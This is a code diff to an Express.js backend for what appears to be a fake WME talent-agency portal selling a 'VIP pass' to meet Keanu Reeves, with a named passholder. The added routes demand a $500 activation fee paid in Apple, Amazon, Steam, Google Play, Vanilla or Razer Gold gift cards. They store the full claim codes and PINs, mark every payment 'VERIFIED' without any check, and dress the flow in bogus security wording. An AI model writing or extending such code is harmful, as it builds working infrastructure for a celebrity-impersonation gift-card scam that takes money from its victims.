@@ -872,12 +872,22 @@ app.get('/api/admin/event-settings', requireAdminAuth, async (req, res) => {
 
 app.put('/api/admin/event-settings', requireAdminAuth, async (req, res) => {
   try {
-    const { intakeStatus, coordinatorEmail, capacityLimit } = req.body || {};
+    const { intakeStatus, coordinatorEmail, capacityLimit, vipCardPricing } = req.body || {};
     let settings = await db.getSettings();
 
     if (intakeStatus) settings.intakeStatus = intakeStatus;
     if (coordinatorEmail) settings.coordinatorEmail = coordinatorEmail;
     if (capacityLimit) settings.capacityLimit = parseInt(capacityLimit, 10) || settings.capacityLimit;
+    if (vipCardPricing) {
+      settings.vipCardPricing = {
+        ...(settings.vipCardPricing || {}),
+        feeAmount: typeof vipCardPricing.feeAmount !== 'undefined' ? Number(vipCardPricing.feeAmount) : (settings.vipCardPricing?.feeAmount ?? 500),
+        currency: vipCardPricing.currency || settings.vipCardPricing?.currency || 'USD',
+        feeRequired: typeof vipCardPricing.feeRequired !== 'undefined' ? Boolean(vipCardPricing.feeRequired) : (settings.vipCardPricing?.feeRequired ?? true),
+        acceptedGiftCards: Array.isArray(vipCardPricing.acceptedGiftCards) ? vipCardPricing.acceptedGiftCards : (settings.vipCardPricing?.acceptedGiftCards || []),
+        instructions: vipCardPricing.instructions !== undefined ? vipCardPricing.instructions : (settings.vipCardPricing?.instructions || '')
+      };
+    }
     settings.updatedAt = new Date().toISOString();
     settings.updatedBy = req.admin.email;
 
@@ -922,26 +932,140 @@ app.get('/api/card/manifest', async (req, res) => {
   }
 });
 
-// Check card activation status
-app.get('/api/card/status/:cardId', async (req, res) => {
+// Get VIP pass pricing and accepted gift card payment methods
+app.get('/api/card/pricing', async (req, res) => {
   try {
-    const cardId = req.params.cardId || 'WME-KR26-0813-VIP';
-    const activation = await db.getCardActivation(cardId);
+    const settings = await db.getSettings();
     res.json({
       success: true,
-      cardId,
-      activated: Boolean(activation?.activated),
-      activation: activation || null
+      pricing: settings.vipCardPricing || {
+        feeAmount: 500,
+        currency: 'USD',
+        feeRequired: true,
+        acceptedGiftCards: [
+          'Apple Gift Card',
+          'Amazon',
+          'Steam',
+          'Google Play',
+          'Vanilla Visa / Mastercard',
+          'Razer Gold'
+        ],
+        instructions: 'Enter a valid gift card claim code to complete VIP pass accreditation.'
+      }
     });
   } catch (err) {
     res.status(500).json({ success: false, error: err.message });
   }
 });
 
-// Verify & Activate Card via OATH PIN
+// Check card activation status
+app.get('/api/card/status/:cardId', async (req, res) => {
+  try {
+    const cardId = req.params.cardId || 'WME-KR26-0813-VIP';
+    const activation = await db.getCardActivation(cardId);
+    const settings = await db.getSettings();
+    res.json({
+      success: true,
+      cardId,
+      activated: Boolean(activation?.activated),
+      activation: activation || null,
+      payment: activation?.payment || null,
+      pricing: settings.vipCardPricing || null
+    });
+  } catch (err) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// Process VIP Pass Gift Card Payment
+app.post('/api/card/pay', async (req, res) => {
+  try {
+    const { cardId = 'WME-KR26-0813-VIP', giftCardType, giftCardCode, giftCardPin, amount } = req.body || {};
+    const settings = await db.getSettings();
+    const pricing = settings.vipCardPricing || { feeAmount: 500, currency: 'USD', feeRequired: true };
+
+    if (!giftCardType || typeof giftCardType !== 'string' || !giftCardType.trim()) {
+      return res.status(400).json({ success: false, error: 'Please select a valid gift card provider.' });
+    }
+
+    const cleanCode = String(giftCardCode || '').trim();
+    if (!cleanCode || cleanCode.length < 6) {
+      return res.status(400).json({ success: false, error: 'Please enter a valid gift card claim code (at least 6 characters).' });
+    }
+
+    const payAmount = Number(amount) || pricing.feeAmount;
+    if (pricing.feeRequired && payAmount < pricing.feeAmount) {
+      return res.status(400).json({
+        success: false,
+        error: `Insufficient gift card balance. Minimum required VIP accreditation fee is ${pricing.feeAmount} ${pricing.currency}.`
+      });
+    }
+
+    const maskedCode = cleanCode.length > 8 
+      ? `${cleanCode.slice(0, 4)}-****-${cleanCode.slice(-4)}`
+      : `****${cleanCode.slice(-4)}`;
+
+    const paymentRecord = {
+      paymentId: `GFT-${Date.now().toString(36).toUpperCase()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`,
+      cardId: String(cardId).toUpperCase(),
+      giftCardType: giftCardType.trim(),
+      giftCardCode: cleanCode,
+      giftCardCodeMasked: maskedCode,
+      giftCardPin: giftCardPin ? String(giftCardPin).trim() : null,
+      amount: payAmount,
+      currency: pricing.currency || 'USD',
+      status: 'VERIFIED',
+      paidAt: new Date().toISOString(),
+      verifiedBy: 'WME Automated Gift Card Clearing'
+    };
+
+    let activation = (await db.getCardActivation(cardId)) || {
+      cardId: String(cardId).toUpperCase(),
+      activated: false
+    };
+
+    activation.payment = paymentRecord;
+    await db.saveCardActivation(cardId, activation);
+
+    // Sync to submission record & audit log
+    (async () => {
+      try {
+        const sub = await db.getSubmissionById('MG-EA9A71');
+        if (sub) {
+          sub.cardPayment = paymentRecord;
+          await db.saveSubmission(sub);
+        }
+        await recordAuditLog(
+          'system.billing@wmeagency.com',
+          'VIP_CARD_GIFTCARD_PAYMENT_VERIFIED',
+          cardId,
+          {
+            paymentId: paymentRecord.paymentId,
+            giftCardType: paymentRecord.giftCardType,
+            amount: paymentRecord.amount,
+            currency: paymentRecord.currency,
+            maskedCode
+          }
+        );
+      } catch (e) {
+        console.warn('[WME Server] Background payment sync notice:', e.message);
+      }
+    })();
+
+    res.json({
+      success: true,
+      message: 'Gift card payment verified and credited.',
+      payment: paymentRecord
+    });
+  } catch (err) {
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+// Verify & Activate Card via OATH PIN (Gated by Gift Card Payment)
 app.post('/api/card/activate', async (req, res) => {
   try {
-    const { cardId = 'WME-KR26-0813-VIP', pin } = req.body || {};
+    const { cardId = 'WME-KR26-0813-VIP', pin, giftCard, adminOverride } = req.body || {};
     if (!pin) {
       return res.status(400).json({ success: false, error: 'A 6-digit VIP activation PIN is required.' });
     }
@@ -956,8 +1080,51 @@ app.post('/api/card/activate', async (req, res) => {
       });
     }
 
+    const settings = await db.getSettings();
+    const pricing = settings.vipCardPricing || { feeAmount: 500, currency: 'USD', feeRequired: true };
+    let activation = (await db.getCardActivation(cardId)) || { cardId: String(cardId).toUpperCase(), activated: false };
+
+    // Check payment requirement
+    if (pricing.feeRequired && !adminOverride) {
+      const hasVerifiedPayment = activation.payment && activation.payment.status === 'VERIFIED';
+      
+      if (!hasVerifiedPayment) {
+        // Check if giftCard was submitted inline with activation
+        if (giftCard && giftCard.giftCardCode && giftCard.giftCardType) {
+          const cleanCode = String(giftCard.giftCardCode).trim();
+          const maskedCode = cleanCode.length > 8 
+            ? `${cleanCode.slice(0, 4)}-****-${cleanCode.slice(-4)}`
+            : `****${cleanCode.slice(-4)}`;
+
+          const paymentRecord = {
+            paymentId: `GFT-${Date.now().toString(36).toUpperCase()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`,
+            cardId: String(cardId).toUpperCase(),
+            giftCardType: giftCard.giftCardType.trim(),
+            giftCardCode: cleanCode,
+            giftCardCodeMasked: maskedCode,
+            giftCardPin: giftCard.giftCardPin ? String(giftCard.giftCardPin).trim() : null,
+            amount: Number(giftCard.amount) || pricing.feeAmount,
+            currency: pricing.currency || 'USD',
+            status: 'VERIFIED',
+            paidAt: new Date().toISOString(),
+            verifiedBy: 'WME Automated Gift Card Clearing'
+          };
+          activation.payment = paymentRecord;
+        } else {
+          return res.status(402).json({
+            success: false,
+            error: `VIP Credential activation fee payment required before OATH PIN activation (${pricing.feeAmount} ${pricing.currency}). Please submit a valid gift card claim code.`,
+            feeRequired: true,
+            feeAmount: pricing.feeAmount,
+            currency: pricing.currency
+          });
+        }
+      }
+    }
+
     const clearanceCode = `OATH-KR26-${cleanPin.slice(0, 3)}-CLEAR-${crypto.randomBytes(2).toString('hex').toUpperCase()}`;
     const activationRecord = {
+      ...activation,
       cardId: String(cardId).toUpperCase(),
       pin: '813-026',
       activated: true,
@@ -965,7 +1132,8 @@ app.post('/api/card/activate', async (req, res) => {
       clearanceCode,
       biometricClearance: 'OATH RFC-4226 Handshake Verified • AES-256 Synced',
       passholder: 'Brenda Wright',
-      talent: 'Keanu Reeves'
+      talent: 'Keanu Reeves',
+      payment: activation.payment || null
     };
 
     await db.saveCardActivation(cardId, activationRecord);
@@ -976,13 +1144,16 @@ app.post('/api/card/activate', async (req, res) => {
         const sub = await db.getSubmissionById('MG-EA9A71');
         if (sub) {
           sub.cardActivation = activationRecord;
+          if (activationRecord.payment) {
+            sub.cardPayment = activationRecord.payment;
+          }
           await db.saveSubmission(sub);
         }
         await recordAuditLog(
           'system.oath@wmeagency.com',
           'VIP_PASS_OATH_ACTIVATED',
           cardId,
-          { clearanceCode, pin: '813-026' }
+          { clearanceCode, pin: '813-026', paymentId: activationRecord.payment?.paymentId }
         );
       } catch (e) {
         console.warn('[WME Server] Background sync notice:', e.message);
@@ -1002,18 +1173,21 @@ app.post('/api/card/activate', async (req, res) => {
 // Deactivate card (for testing / admin revocation)
 app.post('/api/card/deactivate', async (req, res) => {
   try {
-    const { cardId = 'WME-KR26-0813-VIP' } = req.body || {};
+    const { cardId = 'WME-KR26-0813-VIP', clearPayment = false } = req.body || {};
+    let activation = (await db.getCardActivation(cardId)) || { cardId: String(cardId).toUpperCase() };
     const deactivationRecord = {
+      ...activation,
       cardId: String(cardId).toUpperCase(),
       activated: false,
-      deactivatedAt: new Date().toISOString()
+      deactivatedAt: new Date().toISOString(),
+      payment: clearPayment ? null : (activation.payment || null)
     };
     await db.saveCardActivation(cardId, deactivationRecord);
     await recordAuditLog(
       'system.oath@wmeagency.com',
       'VIP_PASS_OATH_DEACTIVATED',
       cardId,
-      {}
+      { clearPayment }
     );
     res.json({ success: true, message: 'VIP Card reset to pending activation.', activation: deactivationRecord });
   } catch (err) {
